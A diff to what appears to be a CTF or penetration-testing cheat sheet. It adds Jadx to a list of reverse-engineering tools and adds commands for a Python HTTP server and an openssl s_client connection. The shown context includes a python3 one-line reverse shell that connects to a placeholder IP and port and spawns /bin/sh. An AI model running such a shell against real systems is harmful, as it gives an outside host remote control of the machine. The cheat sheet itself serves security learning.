@@ -65,11 +65,12 @@ Example usage: steghide <command> <file>
 * strings
 * ltrace
 * strace
-* apktool
 * frida
 * gdb / gdb-peda
 * hexdump (-C option very useful)
 * objdump
+* apktool
+* Jadx -- Java decompiler 
 
 ---
 
@@ -115,6 +116,15 @@ Example usage: searchsploit OpenSSH 7.2p2
 * reverse shell with one line only, using python3:
 ```
     python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+* run a simple python3 server:
+```
+    python -m http.server
+```
+* create a generic ssl/tls client which establishes a connection to a remote server speaking ssl/tls.
+```
+Example:    openssl s_client -connect <ip_address>:<port>
+    If all it is ok, paste the password and it’s done.
 ```
 
 
